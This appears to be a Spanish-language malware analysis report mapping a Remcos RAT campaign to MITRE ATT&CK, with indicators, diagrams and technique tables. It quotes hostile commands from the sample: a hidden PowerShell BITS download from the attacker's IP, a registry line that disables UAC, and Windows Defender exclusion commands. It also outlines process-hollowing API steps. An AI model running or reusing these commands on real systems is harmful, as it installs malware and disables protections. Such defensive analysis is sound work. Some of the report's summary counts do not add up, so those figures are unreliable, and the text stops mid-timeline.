# MATRIZ MITRE ATT&CK - Campaña Remcos RAT

**Fecha del Incidente:** 10 de Febrero de 2026
**Malware:** Remcos RAT (Remote Control & Surveillance) — [MITRE S0332](https://attack.mitre.org/software/S0332/)
**Vector Inicial:** Romulo.hta (HTA con VBScript ofuscado)
**Dropper:** SyAlpha16.exe (Embarcadero Delphi XE3)
**SHA-256:** `9f84bbd8179674ee35fd11e94435df0c49c81bb5ca44c2f5ad4b5bec53f0ab35`
**Framework:** [MITRE ATT&CK Enterprise v16](https://attack.mitre.org/matrices/enterprise/)

---

## Cadena de Infección

```
[ETAPA 0] Romulo.hta
    │  VBScript → XOR decode → PowerShell → Start-BitsTransfer
    │  Descarga http://192.159.99.10/XSyAlpha16.zip → C:\Users\Public\
    ▼
[ETAPA 1] SyAlpha16.exe (PID 8884) — DROPPER
    │  Despliega 9 archivos en C:\ProgramData\store_adapter_x64\
    │  Aplica timestomping a todos los archivos
    │  Lanza copia persistente como proceso hijo
    ▼
[ETAPA 2] SyAlpha16.exe (PID 1176) — LOADER
    │  Descifra PE de Remcos (39D9641.tmp) reconstruyendo header MZ byte a byte
    │  Crea FrameTrac32.exe (shell vacío) y Chime.exe
    │  Pasa rutas de payloads via env vars ofuscadas
    │  Process Hollowing: crea FrameTrac32.exe suspendido, vacía su memoria,
    │  carga Remcos en el espacio de memoria de FrameTrac32.exe, lo resume
    ▼
[ETAPA 3] FrameTrac32.exe (PID 8364) — REMCOS RAT (código de Remcos ejecutándose
    │  dentro del espacio de memoria de FrameTrac32.exe)
    │  RAT completo: keylogger, C2, captura de pantalla/audio/clipboard
    │  Establece comunicación C2 → 192.159.99.19:1122/TCP (RC4)
    │  Inicia keylogger offline → C:\ProgramData\dt\logs.dat
    ▼
[ETAPA 4] Chime.exe (PID 8392) — PERSISTENCE HELPER
       Crea tarea programada "CLI" usando TS 1.0 (.job) + TS 2.0 (XML)
       Persistencia redundante
```

---

## Matriz por Táctica

Cada técnica está marcada con su estado de observación:
- **CONFIRMADA** — Ejecutada y observada en la evidencia (ProcMon / DMP)
- **LATENTE** — Encontrada en memoria del RAT, preparada pero no ejecutada durante la captura
- **CAPACIDAD** — DLL o API cargada que habilita la capacidad, sin evidencia de uso activo

---

### INITIAL ACCESS

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing | Spearphishing Attachment | 0 | Archivo `Romulo.hta` entregado a la víctima (probable adjunto de email) | CONFIRMADA |

> **Qué pasó:** La víctima recibió el archivo `Romulo.hta`. Al abrirlo, Windows lo ejecutó automáticamente con `mshta.exe`, iniciando la cadena de infección.

---

### EXECUTION

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution | Malicious File | 0 | Usuario abrió `Romulo.hta` manualmente | CONFIRMADA |
| [T1059.005](https://attack.mitre.org/techniques/T1059/005/) | Command and Scripting Interpreter | Visual Basic | 0 | VBScript en Romulo.hta: función `ProcessRoutine886()` decodifica payload con XOR (clave 55), `CreateObject("WScript.Shell")`, `plc.Run sgzzt, 0, True` | CONFIRMADA |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter | PowerShell | 0 | `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-BitsTransfer..."` | CONFIRMADA |
| [T1106](https://attack.mitre.org/techniques/T1106/) | Native API | — | 1-4 | Procesos WOW64 (32-bit), interfaces COM para Task Scheduler (`ITaskService` via CLSID `{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}`), APIs: `CreateMutexA`, `OpenMutexA`, `CopyFileW`, `MoveFileW` | CONFIRMADA |
| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task/Job | Scheduled Task | 4 | `Chime.exe` crea tarea `CLI` via `taskschd.dll` (TS 2.0) y `mstask.dll` (TS 1.0) | CONFIRMADA |

> **Qué pasó:** El HTA ejecutó VBScript que decodificó un comando PowerShell ofuscado con XOR. PowerShell descargó el dropper usando BITS y lo ejecutó. El dropper y sus hijos utilizan APIs nativas de Windows y COM para operar. La persistencia se establece creando tareas programadas.

---

### PERSISTENCE

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task/Job | Scheduled Task | 4 | Tarea `CLI` creada dos veces: `C:\Windows\Tasks\CLI.job` (TS 1.0, 274 bytes) + `C:\Windows\System32\Tasks\CLI` (TS 2.0, XML via RPC). Redundancia deliberada. | CONFIRMADA |
| [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution | Registry Run Keys / Startup Folder | 3 | Strings en DMP: `Software\Microsoft\Windows\CurrentVersion\Run\`, `...\Policies\Explorer\Run\`, `%APPDATA%\...\Startup\`. Templates configurables, activables por comando C2. | LATENTE |

> **Qué pasó:** `Chime.exe` creó la tarea programada `CLI` usando ambas APIs de Task Scheduler (1.0 legacy + 2.0 moderna) para garantizar persistencia redundante. Adicionalmente, el RAT tiene en memoria 3 vectores de persistencia adicionales (Registry Run, Policy Run, Startup Folder) listos para activarse por comando remoto.

---

### PRIVILEGE ESCALATION

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Process Injection | Process Hollowing | 2→3 | Loader crea `FrameTrac32.exe` en estado **suspendido** (`CREATE_SUSPENDED`), vacía/desmapea la imagen original del EXE de su espacio de memoria, y escribe el PE de Remcos (desde `39D9641.tmp`) directamente en ese espacio. El PE de Remcos aparece cargado en `0x1d0000` **ANTES** de la imagen del EXE en `0x320000` — orden invertido que confirma hollowing. Al resumir el proceso, **Remcos se ejecuta dentro del espacio de FrameTrac32.exe**. | CONFIRMADA |
| [T1548.002](https://attack.mitre.org/techniques/T1548/002/) | Abuse Elevation Control Mechanism | Bypass User Account Control | 3 | String en DMP: `/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f` | LATENTE |

> **Qué pasó:** El Loader creó el proceso `FrameTrac32.exe` en estado suspendido, vació su memoria original y cargó el PE de Remcos en su espacio de direcciones (Process Hollowing). Al resumir el hilo principal, **Remcos se ejecuta como si fuera FrameTrac32.exe** — desde fuera parece un proceso legítimo, pero el código real es Remcos RAT. El bypass de UAC está preparado en memoria pero no se ejecutó durante la captura.

---

### DEFENSE EVASION

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1218.005](https://attack.mitre.org/techniques/T1218/005/) | System Binary Proxy Execution | Mshta | 0 | `Romulo.hta` se ejecuta via `mshta.exe`, binario firmado de Microsoft, para ejecutar VBScript malicioso evadando restricciones de ejecución directa de scripts. | CONFIRMADA |
| [T1197](https://attack.mitre.org/techniques/T1197/) | BITS Jobs | — | 0 | `Start-BitsTransfer -Source 'http://192.159.99.10/XSyAlpha16.zip'`. Usa el servicio legítimo BITS de Windows para descargar el payload, evitando detección por herramientas que solo monitorizan descargas directas HTTP. | CONFIRMADA |
| [T1140](https://attack.mitre.org/techniques/T1140/) | Deobfuscate/Decode Files or Information | — | 0, 2 | **Etapa 0:** HTA decodifica payload con XOR (clave 55) en `ProcessRoutine886()`. **Etapa 2:** Loader descifra el PE de Remcos (`39D9641.tmp`) reconstruyendo header PE byte a byte (`0x4D` = 'M', `0x5A` = 'Z'). | CONFIRMADA |
| [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | Masquerading | Match Legitimate Name or Location | 0, 1 | **HTA:** Título `"Documento"` simula archivo legítimo. **Dropper:** Crea logs falsos en `PCGameBoost\Smart Game Booster\`, DLLs con nombres legítimos (`Focus.dll`, `HardwareLib.dll`, `Temperature.dll`, `webres.dll`), directorio `store_adapter_x64` imita componente Windows Store. | CONFIRMADA |
| [T1070.006](https://attack.mitre.org/techniques/T1070/006/) | Indicator Removal | Timestomp | 1 | `SetBasicInformationFile` en los 9 archivos desplegados: `LastWriteTime` falsificado a `11/15/2025 2:14:18 PM` (87 días antes). El `ChangeTime` de NTFS (`2/10/2026 3:18:38 PM`) delata la fecha real. | CONFIRMADA |
| [T1027.002](https://attack.mitre.org/techniques/T1027/002/) | Obfuscated Files or Information | Software Packing | 2 | PE de Remcos (`39D9641.tmp`): header PE cifrado, cuerpo de 540 KB, descifrado en 4 fases con retraso de 5.8 seg entre escrituras. Magic number `MZ` reconstruido byte a byte. Archivos con extensiones inventadas: `.opiw`, `.qks`. Config RAT cifrada en registro (`cuatlfw` = REG_BINARY, 84 bytes). | CONFIRMADA |
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | — | 0, 2 | **HTA:** Strings hexadecimales fragmentados en 10 variables (`tlh0`-`tlh9`), XOR con clave 55. **Loader:** Variables de entorno con nombres aleatorios como IPC: `GLEDSZLAVXNMFDXBKWBNV`, `JFTWAEPAAJXCSXDCCJARPKGGA`, `KYODXHLJLNHUWROQLAC`, `MDHWXQZIXALHFWKIJRVM`. | CONFIRMADA |
| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Process Injection | Process Hollowing | 2→3 | `FrameTrac32.exe` creado suspendido → su memoria es vaciada → el PE de Remcos (desde `39D9641.tmp`) es cargado en su espacio de direcciones (`0x1d0000`). El EXE original es un shell vacío; **Remcos se ejecuta dentro de FrameTrac32.exe**. | CONFIRMADA |
| [T1564.003](https://attack.mitre.org/techniques/T1564/003/) | Hide Artifacts | Hidden Window | 0 | HTA: `WINDOWSTATE="minimize"`, `SHOWINTASKBAR="no"`, `BORDER="none"`. PowerShell: `-WindowStyle Hidden`. SyAlpha16.exe: `-WindowStyle Hidden`. Toda la cadena se ejecuta invisible al usuario. | CONFIRMADA |
| [T1112](https://attack.mitre.org/techniques/T1112/) | Modify Registry | — | 3 | Crea `HKCU\SOFTWARE\Rmc-3BDZ4Q\` con: `cuatlfw` (config cifrada, 84 bytes), `uwvstck` (hash MD5: `A4855D857EAA75E1530A4864E2AB70F1`), `UID` (428899031), `ailm` (timestamp 1770751486). | CONFIRMADA |
| [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Impair Defenses | Disable or Modify Tools | 3 | String en DMP: `powershell.exe -Command "Add-MpPreference -ExclusionPath '%s'"`. Comando preparado para excluir la ruta del malware de Windows Defender. También presente: `Remove-MpPreference -ExclusionPath '%s'`. | LATENTE |

> **Qué pasó:** La cadena usa múltiples capas de evasión. Comienza con `mshta.exe` (binario firmado Microsoft) para ejecutar el HTA, usa BITS para descargar sin levantar alertas, ofusca todo con XOR, oculta todas las ventanas, falsifica timestamps de archivos, se disfraza de software legítimo, cifra el PE de Remcos reconstruyendo el header MZ byte a byte, y usa Process Hollowing para cargar Remcos dentro del espacio de memoria de un proceso legítimo. La configuración del RAT se almacena cifrada en el registro.

---

### CREDENTIAL ACCESS

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1056.001](https://attack.mitre.org/techniques/T1056/001/) | Input Capture | Keylogging | 3 | Keylogger activado 21 seg después de iniciar. Crea `C:\ProgramData\dt\logs.dat` (352 bytes de keystrokes capturados). Strings en DMP: `"Offline Keylogger Started"`, `"Online Keylogger Started"`. Dos modos: offline (guarda local) y online (streaming al C2). | CONFIRMADA |

> **Qué pasó:** A las 3:24:51 PM, 21 segundos después de arrancar, el RAT activó su keylogger en modo offline, guardando capturas de teclas en `logs.dat`. Tiene capacidad de modo online (streaming directo al C2) activable por comando remoto.

---

### DISCOVERY

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1057](https://attack.mitre.org/techniques/T1057/) | Process Discovery | — | 3 | DLL cargada: `psapi.dll` (Process Status API). Permite enumerar procesos en ejecución. | CAPACIDAD |
| [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | — | 1, 3 | `HardwareLib.dll` (módulo de reconocimiento de hardware). DLLs de red: `IPHLPAPI.DLL` (configuración de red), `dnsapi.dll` (resolución DNS). Chime.exe enumera `Explorer Desktop NameSpace` y `MyComputer NameSpace`. | CONFIRMADA |

> **Qué pasó:** El malware recopila información del sistema mediante módulos dedicados (`HardwareLib.dll`) y APIs de Windows. Enumera procesos, configuración de red, y espacios de nombres del sistema.

---

### COLLECTION

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1056.001](https://attack.mitre.org/techniques/T1056/001/) | Input Capture | Keylogging | 3 | `C:\ProgramData\dt\logs.dat` — 352 bytes de keystrokes capturados. Strings DMP: `"Offline Keylogger Started"`, `"Online Keylogger Started"`. | CONFIRMADA |
| [T1115](https://attack.mitre.org/techniques/T1115/) | Clipboard Data | — | 3 | Valor de registro `HKCU\SOFTWARE\Rmc-3BDZ4Q\CooLib` consultado (estado del clipboard logger). | LATENTE |
| [T1113](https://attack.mitre.org/techniques/T1113/) | Screen Capture | — | 3 | DLL cargada: `GdiPlus.dll` (API de gráficos, permite captura de pantalla). | CAPACIDAD |
| [T1123](https://attack.mitre.org/techniques/T1123/) | Audio Capture | — | 3 | DLL cargada: `winmm.dll` (API multimedia, permite captura de micrófono). | CAPACIDAD |
| [T1074.001](https://attack.mitre.org/techniques/T1074/001/) | Data Staged | Local Data Staging | 3 | Keystrokes almacenados localmente en `C:\ProgramData\dt\logs.dat` para posterior exfiltración al C2. | CONFIRMADA |

> **Qué pasó:** El RAT captura keystrokes activamente y los almacena en `logs.dat` para exfiltración posterior. Tiene capacidades cargadas (DLLs en memoria) para captura de pantalla, audio y portapapeles, activables por comando C2.

---

### COMMAND AND CONTROL

| ID | Técnica | Sub-técnica | Etapa | Evidencia | Estado |
|----|---------|-------------|-------|-----------|--------|
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | — | 0 | `Start-BitsTransfer -Source 'http://192.159.99.10/XSyAlpha16.zip' -Destination 'C:\Users\Public\SyAlpha16.zip'`. Descarga del dropper desde servidor controlado por el atacante. | CONFIRMADA |
| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol | Web Protocols | 0 | Descarga HTTP desde `http://192.159.99.10/XSyAlpha16.zip` (puerto 80). | CONFIRMADA |
| [T1571](https://attack.mitre.org/techniques/T1571/) | Non-Standard Port | — | 3 | C2 en `192.159.99.19:1122/TCP`. Puerto 1122 no está asignado a servicios estándar. 4 sesiones observadas con intentos de reconexión cada ~22 seg. | CONFIRMADA |
| [T1573.001](https://attack.mitre.org/techniques/T1573/001/) | Encrypted Channel | Symmetric Cryptography | 3 | Remcos cifra todas las comunicaciones C2 con RC4 usando la clave almacenada en la configuración cifrada (`cuatlfw`). | CONFIRMADA |

> **Qué pasó:** El payload inicial se descargó por HTTP desde `192.159.99.10`. Una vez instalado, el RAT establece comunicación C2 con `192.159.99.19` en puerto TCP 1122 usando protocolo propietario Remcos cifrado con RC4. Durante la captura, el C2 no respondió. El RAT intentó reconectar en 4 sesiones (puertos locales 49780→49783) con intervalos de ~22 segundos.

---

## Diagrama de Flujo del Ataque

```
                                 CAMPAÑA REMCOS RAT
                           Diagrama de Flujo del Ataque
                        Mapeado a MITRE ATT&CK Enterprise

    ┌─────────────────────────────────────────────────────────────────────────┐
    │                        VECTOR INICIAL (ETAPA 0)                       │
    │                                                                       │
    │  Atacante envía Romulo.hta a la víctima                               │
    │  ┌─────────────┐    T1566.001 Spearphishing Attachment                │
    │  │ Romulo.hta   │                                                      │
    │  │ "Documento"  │                                                      │
    │  └──────┬──────┘                                                      │
    │         │ Usuario abre (doble clic)   T1204.002 User Execution        │
    │         ▼                                                              │
    │  ┌─────────────┐    T1218.005 Mshta (proxy de ejecución)              │
    │  │  mshta.exe   │    T1564.003 Hidden Window (minimizado, no taskbar) │
    │  └──────┬──────┘                                                      │
    │         │ Ejecuta VBScript embebido                                    │
    │         ▼                                                              │
    │  ┌──────────────────────────────────────────┐                         │
    │  │ VBScript: ProcessRoutine886()             │  T1059.005 VBScript     │
    │  │ XOR decode (clave 55) de hex fragmentado  │  T1140 Deobfuscate     │
    │  │ en 10 variables (tlh0-tlh9)               │  T1027 Obfuscation     │
    │  └──────────────┬───────────────────────────┘                         │
    │                 │ Crea WScript.Shell → .Run                            │
    │                 ▼                                                      │
    │  ┌──────────────────────────────────────────┐                         │
    │  │ PowerShell (oculto)                       │  T1059.001 PowerShell   │
    │  │ -WindowStyle Hidden                       │  T1564.003 Hidden Win   │
    │  │ -ExecutionPolicy Bypass                   │                         │
    │  │ -NoProfile                                │                         │
    │  └──────────────┬───────────────────────────┘                         │
    │                 │ Start-BitsTransfer                                    │
    │                 ▼                                                      │
    │  ┌──────────────────────────────────────────┐                         │
    │  │ BITS descarga desde:                      │  T1197 BITS Jobs        │
    │  │ http://192.159.99.10/XSyAlpha16.zip       │  T1105 Tool Transfer   │
    │  │ → C:\Users\Public\SyAlpha16.zip           │  T1071.001 HTTP        │
    │  │                                           │                         │
    │  │ Expand-Archive → C:\Users\Public\         │                         │
    │  │ Start-Process SyAlpha16.exe (oculto)      │                         │
    │  └──────────────┬───────────────────────────┘                         │
    └─────────────────┼───────────────────────────────────────────────────────┘
                      │
                      ▼
    ┌─────────────────────────────────────────────────────────────────────────┐
    │                          DROPPER (ETAPA 1)                            │
    │                   SyAlpha16.exe — PID 8884 — 18 seg                   │
    │                                                                       │
    │  ┌──────────────────────────────────┐                                 │
    │  │ Camuflaje                         │  T1036.005 Masquerading         │
    │  │ Crea logs falsos:                 │                                 │
    │  │ PCGameBoost\Smart Game Booster\   │                                 │
    │  │ SyAlpha16AppRun.log               │                                 │
    │  └──────────────┬───────────────────┘                                 │
    │                 ▼                                                      │
    │  ┌──────────────────────────────────┐                                 │
    │  │ Despliegue de 9 archivos en:      │  T1027.002 Software Packing    │
    │  │ C:\ProgramData\store_adapter_x64\ │                                │
    │  │                                   │                                 │
    │  │ Focus.dll        (555 KB)         │                                 │
    │  │ HardwareLib.dll  (189 KB)         │                                 │
    │  │ Temperature.dll  (177 KB)         │                                 │
    │  │ webres.dll       (904 KB)         │                                 │
    │  │ rtl120.bpl       (1.1 MB)         │                                 │
    │  │ vcl120.bpl       (2.0 MB)         │                                 │
    │  │ Saikdrarceer.opiw (25 KB)         │                                 │
    │  │ Droulcleendrood.qks (1.5 MB)      │                                │
    │  │ SyAlpha16.exe     (2.5 MB) copia  │                                │
    │  └──────────────┬───────────────────┘                                 │
    │                 ▼                                                      │
    │  ┌──────────────────────────────────┐                                 │
    │  │ Timestomping de TODOS             │  T1070.006 Timestomp           │
    │  │ LastWriteTime → 11/15/2025        │                                │
    │  │ (87 días antes de fecha real)     │                                 │
    │  └──────────────┬───────────────────┘                                 │
    │                 │ Lanza copia persistente                               │
    │                 │ EXIT PID 8884 (status 0)                             │
    └─────────────────┼───────────────────────────────────────────────────────┘
                      │
                      ▼
    ┌─────────────────────────────────────────────────────────────────────────┐
    │                          LOADER (ETAPA 2)                             │
    │                   SyAlpha16.exe — PID 1176 — 62 seg                   │
    │                                                                       │
    │  ┌──────────────────────────────────┐                                 │
    │  │ Crea payload cifrado:             │  T1027.002 Software Packing    │
    │  │ 37E899E.tmp (1.7 MB)              │                                │
    │  │                                   │                                 │
    │  │ Despliega Chime.exe (634 KB) en:  │                                │
    │  │ AppData\Local\store_adapter_x64\  │                                │
    │  └──────────────┬───────────────────┘                                 │
    │                 ▼                                                      │
    │  ┌──────────────────────────────────────────────────────┐             │
    │  │ Descifrado del PE de Remcos (39D9641.tmp)             │            │
    │  │                                                       │ T1140     │
    │  │ Fase 1: Escribe header CIFRADO (1 KB) + cuerpo (540K)│            │
    │  │ Fase 2: [5.8 seg] Re-escribe bytes 2-1023 descifrados│            │
    │  │ Fase 3: [2.4 seg] Escribe 0x4D ('M') + 0x5A ('Z')   │            │
    │  │         → Reconstrucción del magic number MZ          │            │
    │  │ Fase 4: Flush de página PE (4096 bytes)              │            │
    │  └──────────────┬───────────────────────────────────────┘             │
    │                 ▼                                                      │
    │  ┌──────────────────────────────────┐                                 │
    │  │ Env vars como IPC ofuscado:       │  T1027 Obfuscation             │
    │  │ GLEDSZLAVXNMFDXBKWBNV=pqrfftgwn  │                                │
    │  │ JFTWAEPAAJXCSXDCCJAR...=ruta.exe  │                                │
    │  │ KYODXHLJLNHUWROQLAC=37E899E.tmp  │                                │
    │  │ MDHWXQZIXALHFWKIJRVM=3ECB69C.tmp │                                │
    │  └──────────────┬───────────────────┘                                 │
    │                 ▼                                                      │
    │  ┌──────────────────────────────────────────────────────┐             │
    │  │          PROCESS HOLLOWING (T1055.012)                │            │
    │  │                                                       │            │
    │  │  1. CreateProcess("FrameTrac32.exe", CREATE_SUSPENDED)│            │
    │  │     → PID 8364 creado pero NO ejecuta código aún     │            │
    │  │                                                       │            │
    │  │  2. NtUnmapViewOfSection / ZwUnmapViewOfSection       │            │
    │  │     → Vacía la imagen original de FrameTrac32.exe     │            │
    │  │       de su espacio de memoria                        │            │
    │  │                                                       │            │
    │  │  3. VirtualAllocEx + WriteProcessMemory               │            │
    │  │     → Escribe el PE de Remcos (39D9641.tmp)           │            │
    │  │       en el espacio de memoria de FrameTrac32.exe     │            │
    │  │     → Remcos cargado en 0x1d0000                      │            │
    │  │     → Shell original en 0x320000 (ya vaciado)        │            │
    │  │                                                       │            │
    │  │  4. SetThreadContext + ResumeThread                   │            │
    │  │     → Apunta EIP/RIP al entry point de Remcos        │            │
    │  │     → El proceso se reanuda ejecutando REMCOS,        │            │
    │  │       NO el código original de FrameTrac32.exe        │            │
    │  └──────────────┬───────────────────────────────────────┘             │
    │                 │                                                      │
    │                 │ Lanza Chime.exe (PID 8392)                           │
    │                 │ EXIT PID 1176 (status 0)                             │
    └─────────────────┼───────────────────────────────────────────────────────┘
                      │
           ┌──────────┴──────────┐
           ▼                     ▼
    ┌─────────────────────┐  ┌──────────────────────────────────────────────┐
    │   REMCOS RAT        │  │         PERSISTENCE HELPER (ETAPA 4)        │
    │   (ETAPA 3)         │  │         Chime.exe — PID 8392 — 10 seg       │
    │   FrameTrac32.exe   │  │                                              │
    │   PID 8364          │  │  ┌────────────────────────────────┐          │
    │                     │  │  │ Persistencia #1 (TS 2.0)       │          │
    │  ┌───────────────┐  │  │  │ taskschd.dll → COM ITaskService│ T1053.005│
    │  │ Config en reg  │  │  │  │ Crea XML: System32\Tasks\CLI  │          │
    │  │ HKCU\Rmc-3BDZ │  │  │  └───────────────┬────────────────┘         │
    │  │ cuatlfw (RC4)  │  │  │                  ▼                          │
    │  │ UID=428899031  │  │  │  ┌────────────────────────────────┐         │
    │  │               │  │  │  │ Persistencia #2 (TS 1.0)       │         │
    │  │ T1112         │  │  │  │ mstask.dll → COM legacy         │ T1053.005│
    │  └───────┬───────┘  │  │  │ Crea: C:\Windows\Tasks\CLI.job │         │
    │          ▼           │  │  │ (274 bytes, formato binario)   │         │
    │  ┌───────────────┐  │  │  └────────────────────────────────┘          │
    │  │ C2 Connection  │  │  │                                              │
    │  │ 192.159.99.19  │  │  │  EXIT PID 8392 (status 0)                   │
    │  │ :1122/TCP      │  │  └──────────────────────────────────────────────┘
    │  │ RC4 encrypted  │  │
    │  │               │  │
    │  │ T1571          │  │
    │  │ T1573.001      │  │
    │  │               │  │
    │  │ 4 sesiones     │  │
    │  │ C2 sin resp.   │  │
    │  └───────┬───────┘  │
    │          ▼           │
    │  ┌───────────────┐  │
    │  │ Keylogger      │  │
    │  │ ACTIVO (21s)   │  │
    │  │               │  │
    │  │ logs.dat       │  │
    │  │ (352 bytes)    │  │
    │  │               │  │
    │  │ T1056.001      │  │
    │  │ T1074.001      │  │
    │  └───────────────┘  │
    │                     │
    │  ┌─ LATENTE ──────┐ │
    │  │ T1547.001      │ │
    │  │ Registry Run   │ │
    │  │ Startup Folder │ │
    │  │               │ │
    │  │ T1548.002      │ │
    │  │ UAC Bypass     │ │
    │  │               │ │
    │  │ T1562.001      │ │
    │  │ Defender Excl. │ │
    │  │               │ │
    │  │ T1115          │ │
    │  │ Clipboard      │ │
    │  │               │ │
    │  │ T1113          │ │
    │  │ Screen Cap.    │ │
    │  │               │ │
    │  │ T1123          │ │
    │  │ Audio Cap.     │ │
    │  └───────────────┘ │
    │                     │
    │ [SIGUE EJECUTÁNDOSE]│
    └─────────────────────┘
```

### Leyenda del Diagrama

| Símbolo | Significado |
|---------|-------------|
| `──▶` | Flujo de ejecución |
| `T1xxx` | ID de técnica MITRE ATT&CK |
| `LATENTE` | Capacidad en memoria, no ejecutada durante captura |
| `PID xxxx` | Process ID observado en la captura |

---

## Matriz Visual Consolidada

```
┌──────────────────┬──────────────────┬──────────────────┬──────────────────┬──────────────────┐
│  INITIAL ACCESS  │    EXECUTION     │   PERSISTENCE    │ PRIV ESCALATION  │ DEFENSE EVASION  │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│                  │                  │                  │                  │                  │
│ T1566.001        │ T1204.002        │ T1053.005        │ T1055.012        │ T1218.005        │
│ Spearphishing    │ User Execution   │ Scheduled Task   │ Process          │ Mshta            │
│ Attachment       │ Malicious File   │ CLI (TS1+TS2)    │ Hollowing        │                  │
│                  │                  │                  │                  │ T1197            │
│                  │ T1059.005        │ T1547.001 *      │ T1548.002 *      │ BITS Jobs        │
│                  │ Visual Basic     │ Registry Run /   │ UAC Bypass       │                  │
│                  │ (VBScript)       │ Startup Folder   │                  │ T1140            │
│                  │                  │                  │                  │ Deobfuscate/     │
│                  │ T1059.001        │                  │                  │ Decode           │
│                  │ PowerShell       │                  │                  │                  │
│                  │                  │                  │                  │ T1036.005        │
│                  │ T1106            │                  │                  │ Masquerading     │
│                  │ Native API       │                  │                  │                  │
│                  │                  │                  │                  │ T1070.006        │
│                  │ T1053.005        │                  │                  │ Timestomp        │
│                  │ Scheduled Task   │                  │                  │                  │
│                  │                  │                  │                  │ T1027.002        │
│                  │                  │                  │                  │ Software Packing │
│                  │                  │                  │                  │                  │
│                  │                  │                  │                  │ T1027            │
│                  │                  │                  │                  │ Obfuscated Files │
│                  │                  │                  │                  │                  │
│                  │                  │                  │                  │ T1055.012        │
│                  │                  │                  │                  │ Process          │
│                  │                  │                  │                  │ Hollowing        │
│                  │                  │                  │                  │                  │
│                  │                  │                  │                  │ T1564.003        │
│                  │                  │                  │                  │ Hidden Window    │
│                  │                  │                  │                  │                  │
│                  │                  │                  │                  │ T1112            │
│                  │                  │                  │                  │ Modify Registry  │
│                  │                  │                  │                  │                  │
│                  │                  │                  │                  │ T1562.001 *      │
│                  │                  │                  │                  │ Disable Defender │
└──────────────────┴──────────────────┴──────────────────┴──────────────────┴──────────────────┘

┌──────────────────┬──────────────────┬──────────────────┬──────────────────┐
│ CREDENTIAL ACCESS│    DISCOVERY     │   COLLECTION     │ COMMAND & CTRL   │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│                  │                  │                  │                  │
│ T1056.001        │ T1057            │ T1056.001        │ T1105            │
│ Keylogging       │ Process          │ Keylogging       │ Ingress Tool     │
│                  │ Discovery        │                  │ Transfer         │
│                  │                  │ T1115 *          │                  │
│                  │ T1082            │ Clipboard Data   │ T1071.001        │
│                  │ System Info      │                  │ Web Protocols    │
│                  │ Discovery        │ T1113            │ (HTTP)           │
│                  │                  │ Screen Capture   │                  │
│                  │                  │                  │ T1571            │
│                  │                  │ T1123            │ Non-Standard     │
│                  │                  │ Audio Capture    │ Port (1122)      │
│                  │                  │                  │                  │
│                  │                  │ T1074.001        │ T1573.001        │
│                  │                  │ Local Data       │ Encrypted        │
│                  │                  │ Staging          │ Channel (RC4)    │
└──────────────────┴──────────────────┴──────────────────┴──────────────────┘

* = LATENTE (en memoria, no ejecutada durante la captura)
```

---

## Resumen Estadístico

### Técnicas Únicas por Táctica

| # | Táctica | Técnicas Únicas | % del Total |
|---|---------|----------------|-------------|
| 1 | Defense Evasion | 11 | 35.5% |
| 2 | Execution | 5 | 16.1% |
| 3 | Collection | 5 | 16.1% |
| 4 | Command and Control | 4 | 12.9% |
| 5 | Persistence | 2 | 6.5% |
| 6 | Discovery | 2 | 6.5% |
| 7 | Initial Access | 1 | 3.2% |
| 8 | Privilege Escalation | 2 | 6.5% |
| 9 | Credential Access | 1 | 3.2% |
| | **TOTAL** | **31 entradas** | (20 técnicas únicas, algunas en múltiples tácticas) |

### Conteo de Técnicas Únicas: 20

| Técnica | Tácticas donde aparece |
|---------|----------------------|
| T1055.012 Process Hollowing | Privilege Escalation + Defense Evasion |
| T1053.005 Scheduled Task | Execution + Persistence |
| T1056.001 Keylogging | Credential Access + Collection |
| T1548.002 UAC Bypass | Privilege Escalation *(también Defense Evasion, no ejecutada)* |

### Por Estado de Observación

| Estado | Cantidad | Descripción |
|--------|----------|-------------|
| **CONFIRMADA** | 15 | Ejecutada y observada en ProcMon o DMP |
| **LATENTE** | 3 | En memoria del RAT, activable por comando C2 |
| **CAPACIDAD** | 2 | DLL cargada, sin evidencia de uso activo |

---

## Flujo del Ataque Mapeado a MITRE

```
TIEMPO          ACCIÓN                                    TÉCNICAS MITRE
─────────────────────────────────────────────────────────────────────────────

 [Pre-ataque]   Víctima recibe Romulo.hta                 T1566.001
                                                          │
 [Etapa 0]      Usuario abre Romulo.hta                   T1204.002
                mshta.exe ejecuta VBScript                T1218.005, T1059.005
                XOR decodifica payload                    T1140, T1027
                PowerShell ejecuta descarga               T1059.001, T1564.003
